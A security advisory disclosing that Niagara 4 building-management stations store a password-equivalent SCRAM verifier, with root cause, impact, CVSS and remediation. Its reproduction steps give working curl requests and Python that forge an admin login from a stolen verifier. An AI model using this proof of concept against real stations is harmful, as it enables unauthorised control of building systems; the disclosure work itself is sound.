# TTA-2026-019: Tridium Niagara 4 stores the SCRAM-SHA-256 SaltedPassword, allowing offline forged authentication without a password

**Severity: High** — Suggested CVSS 3.1: 8.5 (`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H`)

### Title

The station's user store keeps the SCRAM `SaltedPassword` — the value that derives the client proof key — so anyone who can read the store can authenticate as any station user, including `admin`, without knowing or cracking the password.

### Summary

Niagara 4 stations authenticate users over HTTP with SCRAM-SHA-256. The station's user configuration stores each account's verifier as `[pbkdf2-sha256.1]=<salt>:<iterations>:<64 hex characters>`.

In a correct SCRAM implementation the server stores `salt`, `iterations`, `StoredKey = H(ClientKey)` and `ServerKey`. The server cannot compute `ClientKey` from `StoredKey`, which is what makes a stolen verifier non-reusable for authentication. In Niagara 4 the third field is the PBKDF2 output `SaltedPassword` itself, and `ClientKey = HMAC-SHA-256(SaltedPassword, "Client Key")`. The station therefore stores a value from which the client proof can be computed directly.

Holding that value is equivalent to holding the password for authentication purposes. An attacker with read access to a station's user store — or to any backup containing it — can complete a login as `admin` with no password, no cracking, and no interaction with the legitimate user. The station accepts the forged proof and issues its session cookie.

This was confirmed against multiple Niagara 4 devices: a JACE controller and a Web Supervisor installation. The forged login returned the server signature that correct SCRAM computation predicts, set `niagara_userid=<user>`, and produced an authenticated management session. It worked for every account in the site's user store, not only the administrator.

The credential material did not require exploitation of the station to obtain. It was present in unencrypted engineering backups on a file share readable by a low-privilege service account, and in the Web Supervisor's site store readable by local administrators.

### Affected Version

- Vendor: Tridium, Inc. (Honeywell)
- Product: Niagara Framework, Niagara 4 (Web Supervisor and JACE controllers)
- Platform generation confirmed on the wire: `fox.version=s:Niagara 4` from the vendor's own Fox protocol greeting on port 1911
- Confirmed affected components: Niagara 4 Web Supervisor station; Niagara 4 JACE controllers
- Affected subsystem: station user store (SCRAM-SHA-256 credential verifier) and the `/j_security_check/` login endpoint
- Default PBKDF2 iteration count observed: 10000

Multiple devices were assessed, covering both a supervisor-class station and controller-class devices. Specific builds were not enumerated. No claim is made about Niagara versions other than the Niagara 4 devices tested, nor about other vendors' SCRAM implementations.

### Vulnerability Type

Authentication Bypass Using an Alternate Path or Channel (CWE-288); Use of a Broken or Risky Cryptographic Algorithm / password-equivalent verifier (CWE-327, CWE-916); Cleartext or unencrypted storage of credential material (CWE-312, CWE-522).

### Affected Code

The implementation is not open source. The affected components are:

- the station user store, which persists the SCRAM verifier per account (`config.bog` in station backups and the live station store);
- the `/j_security_check/` handler, which accepts `application/x-niagara-login-support` SCRAM messages;
- the provisioning and backup path, which writes those stores without encryption.

### Root Cause

SCRAM exists so that a server-side compromise of the verifier does not yield an authentication capability. That property depends entirely on what the server stores:

```
StoredKey  = H(ClientKey)
ClientKey  = HMAC-SHA-256(SaltedPassword, "Client Key")
SaltedPassword = PBKDF2-SHA-256(password, salt, iterations)
```

A server that stores `{salt, iterations, StoredKey, ServerKey}` cannot derive `ClientKey`, so a stolen verifier cannot produce a valid `ClientProof`.

Niagara 4 stores `SaltedPassword` in the third field. Since `ClientKey` is a plain HMAC of that value, the stored material is everything needed to act as the client:

```
ClientKey      = HMAC-SHA-256(SaltedPassword, "Client Key")
StoredKey      = H(ClientKey)
AuthMessage    = client-first-bare + "," + server-first + "," + client-final-without-proof
ClientSignature = HMAC-SHA-256(StoredKey, AuthMessage)
ClientProof    = ClientKey XOR ClientSignature
```

The server verifies the proof against its own `SaltedPassword`, so a proof computed this way validates. Nothing else about SCRAM is broken; the problem is that the persisted verifier is the client's keying material rather than the server's.

Three factors make this operationally severe rather than theoretical:

1. **Backups are credentials.** Engineering backups and provisioning exports contain the station user store unencrypted. Possession of a backup is possession of every station credential in it.
2. **Verifiers are reused.** The same `SaltedPassword` was observed across multiple devices in the same site, so one backup read yields access to several controllers.
3. **The iteration count is low.** 10000 PBKDF2-SHA-256 iterations is far below a current cost target, so even under a "crack it" model the material is weak; under this design it does not need to be cracked at all.

### Steps to Reproduce

Perform this only on a station you own, in a lab. Values are placeholders.

1. Deploy a Niagara 4 station in a lab and create a test account `<SYNTHETIC_USER>` with a known password. Note the station's address as `<STATION_BASE>`.
2. Read the account's verifier from the station's user store — for a lab station, from the station's own configuration file:

   ```
   [pbkdf2-sha256.1]=<SYNTHETIC_SALT_HEX>:10000:<SYNTHETIC_SALTEDPASSWORD_HEX>
   ```

   Confirm the third field is 64 hex characters, i.e. the raw PBKDF2 output, by computing it independently:

   ```bash
   python3 - <<'PY'
   import hashlib
   print(hashlib.pbkdf2_hmac('sha256', b'<SYNTHETIC_PASSWORD>',
         bytes.fromhex('<SYNTHETIC_SALT_HEX>'), 10000).hex())
   PY
   ```

   Observed on the assessed devices: the result equals the stored third field byte for byte. That equality is the finding.

3. Negative control on the same file: change one nibble of the stored value and re-run step 2. The computed value no longer matches, confirming the comparison is real and not a formatting coincidence.

4. Send the SCRAM client-first message, as the station's own login page does:

   ```bash
   curl -sS -k -c cap.jar -X POST "$STATION_BASE/j_security_check/" \
     -H 'Content-Type: application/x-niagara-login-support' \
     --data 'action=sendClientFirstMessage&clientFirstMessage=n,,n=<SYNTHETIC_USER>,r=<SYNTHETIC_CLIENT_NONCE>'
   ```

   Response: `r=<combined nonce>,s=<base64 salt>,i=10000`. Decode `s`; it must equal `<SYNTHETIC_SALT_HEX>`. The station hands the salt to any unauthenticated client, which is normal SCRAM but also means a reader of the store can confirm which device a given verifier belongs to.

5. Compute `ClientProof` from the stored `SaltedPassword` only — no password input:

   ```python
   import base64, hashlib, hmac

   sp        = bytes.fromhex("<SYNTHETIC_SALTEDPASSWORD_HEX>")
   client_key = hmac.new(sp, b"Client Key", hashlib.sha256).digest()
   stored_key = hashlib.sha256(client_key).digest()
   server_key = hmac.new(sp, b"Server Key", hashlib.sha256).digest()

   auth_msg   = f"{client_first_bare},{server_first},{client_final_without_proof}".encode()
   client_sig = hmac.new(stored_key, auth_msg, hashlib.sha256).digest()
   proof      = bytes(a ^ b for a, b in zip(client_key, client_sig))
   expected_v = hmac.new(server_key, auth_msg, hashlib.sha256).digest()
   print(base64.b64encode(proof).decode(), base64.b64encode(expected_v).decode())
   ```

6. Send `c=biws,r=<combined nonce>,p=<proof>` to the same endpoint. Observed result: HTTP 200 with `v=<server signature>` equal to `expected_v`, and `Set-Cookie: niagara_userid=<SYNTHETIC_USER>`. A wrong proof is rejected, so the acceptance is a real verification.

7. Activate the session with exactly one request, then load the management view:

   ```bash
   curl -sS -k -b cap.jar -c cap.jar "$STATION_BASE/j_security_check/" -o /dev/null
   curl -sS -k -b cap.jar "$STATION_BASE/ord/station:|slot:/" -o station.html
   ```

   Observed result: HTTP 200 station view, including the User Manager and Station Manager. For a Web Supervisor the equivalent is the supervisor station view listing the site's user accounts.

   Operational note: a second `GET /j_security_check/` logs the session out. One call activates, two deactivate.

8. Verify the management session is functional but do not change configuration: read the station's own user list and confirm that accounts other than `<SYNTHETIC_USER>` are present, which is the precondition for the generalization in step 9.

9. Generalization: repeat steps 4-7 for a second account using *its* stored verifier. Observed on the assessed deployment: all accounts in the site store authenticated this way, including accounts that are not administrators. This shows the flaw is in the verifier format, not in one account's configuration.

10. Restore the lab station from snapshot. Do not retain any material produced during testing.

### Impact

An attacker who can read a station's user store or any backup containing it authenticates as any user of that station, including administrators, without a password. On the assessed deployment this yielded the Niagara station's management interface: user management, station management, and the graphical HTML5 supervision UI with live alarms and telemetry, plus the station's own RPC and WebSocket interfaces.

Because these stations sit at the top of a building management architecture, a station administrator can read and write the points of the controllers beneath them. That is control over heating, ventilation, air conditioning, lighting, and energy metering for the buildings involved. The impact is not confidentiality of the web application; it is physical-systems control.

Two further properties matter for exploitation:

- **No brute force, no lockout, no noise.** Authentication is a single request pair with a cryptographically valid proof. There is nothing anomalous to detect in the login traffic.
- **No cracking.** The material is used directly, so password strength, length, and rotation policy are irrelevant. Rotating the password changes the `SaltedPassword` and does help — but only if every copy of the store and every backup is also replaced.

The exposure path matters for severity. The verifiers were obtained from unencrypted engineering backups on a share readable by a low-privilege service account, and from the supervisor's site store readable by local administrators. An organisation that treats "read access to a backup share" as low impact does not, on this product, have a low-impact condition.

### CVSS

`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H` — 8.5 High.

Rationale: network-reachable login endpoint (`AV:N`); a valid verifier must first be obtained, which is the high-complexity element (`AC:H`); acquisition required a low-privilege account on a share or local administrator rights (`PR:L`); no user interaction (`UI:N`); the vulnerable component is the station while the impacted component is the building control system beneath it (`S:C`); forged administrator access yields full read and write of station configuration and downstream points (`C:H/I:H/A:H`).

If the verifier store is reachable without authentication — which the backup-share path approximated, since a generic service account sufficed — the same vector with `PR:N` scores 9.0 Critical. The credential-exposure and the verifier-design flaws are separable and a CNA may prefer to score them separately; this advisory scores the chain because neither half is independently sufficient.

## Status

Published as TTA-2026-019 on 2026-10-28. No credential material, station address, site name, or account name is included. Tridium's disclosure process runs through CISA ICS advisories; no published advisory describing this verifier behaviour was identified at the time of writing, and the assigning CNA should confirm whether this is a distinct issue or an incomplete fix of a prior one. CVE eligibility is pending.

No configuration change, point write, or control action was performed on any production station during this assessment. Where a management session was established, it was read-only.

## Prerequisites

- Network reachability to the station's HTTPS port.
- Ability to read the station's user store, a station backup, or a provisioning export that contains it. On the assessed deployment this meant a low-privilege file-share account or local administrator rights on the supervisor host.
- The station's TLS stack may require a legacy client configuration; on the assessed devices an older TLS stack was reachable only with legacy renegotiation or a lowered security level, while a modern client failed the handshake. This affects tooling, not the flaw.

## Relationship to existing advisories and CVEs

- No published CVE was identified that describes Niagara's stored verifier as the SCRAM `SaltedPassword`.
- The industry pattern for this class of defect is a verifier that permits client impersonation; it is distinct from an implementation bug in the protocol handling, and fixing it means changing what is persisted, not how the handshake is parsed.
- Related weakness in the same environment, reported separately within this repository's scope: unencrypted provisioning backups and site credential stores readable by non-privileged accounts. That weakness is the acquisition path, not the flaw described here.

Whether the verifier format and the backup exposure should share one identifier is for Tridium and the assigning CNA to decide. They have different owners: one is a product change, the other is a deployment and backup-handling change.

## Recommended remediation

- Stop persisting `SaltedPassword`. Store `{salt, iterations, StoredKey, ServerKey}` so the on-device material cannot be used to produce a client proof.
- Where backward compatibility requires the current format, migrate on read: derive `StoredKey` and `ServerKey` at login and rewrite the record in the safe form.
- Raise the PBKDF2 iteration count to a current cost target once migration is possible.
- Stop writing unencrypted credential stores into engineering backups and provisioning exports. Encrypt backups with a key that is not stored beside them, or exclude credential material and re-enrol accounts after restore.
- Do not reuse a station's credential store across devices. Where the same verifier was found on several devices, treat all of them as compromised by a single read.
- Restrict direct reachability from IT networks to station management ports; place stations behind a broker or jump path with authentication and logging independent of the station's own.
- Add monitoring for successful authentications from unexpected sources and for authentication that does not follow an interactive session, since forged logins leave a valid but anomalous trace.

## Validation controls

| Case | Expected before fix | Expected after fix |
| --- | --- | --- |
| Forge login with the stored verifier, correct account | succeeds, `niagara_userid` set | refused, no session |
| Forge login with a verifier altered by one nibble | rejected | rejected |
| Authenticate with the correct password | succeeds | succeeds |
| Authenticate with a wrong password | rejected | rejected |
| Read the store and attempt to derive a client proof | proof computed | not possible from stored fields |
| Same verifier from a second device | works on both | each device holds an independent, non-reusable verifier |

## Evidence boundary

The assessment was performed against production building-management equipment in an authorized engagement; the protocol exchanges, the server signature match, the session cookie issuance, and the management views were observed directly. This report excludes every identifying detail: station addresses, hostnames, site names, account names, salts, verifiers, the engineering share path, and the service-account name. No password was cracked and no credential was used against a system outside the authorized scope. No control point was written and no configuration was changed; where a session existed it was read-only.

## Timeline

- 2026-10-13: Protocol-level verification completed against multiple Niagara 4 devices, including the server-signature match and session activation.
- 2026-10-28: Public TTA report published with all identifiers removed.
